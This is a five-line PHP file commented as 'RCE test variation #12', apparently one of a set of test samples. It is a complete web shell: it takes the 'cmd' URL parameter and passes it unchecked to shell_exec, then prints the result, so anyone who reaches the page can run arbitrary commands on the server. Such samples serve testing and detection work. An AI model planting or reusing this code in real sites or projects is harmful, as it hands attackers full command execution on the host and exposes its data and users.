<?php
// RCE test variation #12
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>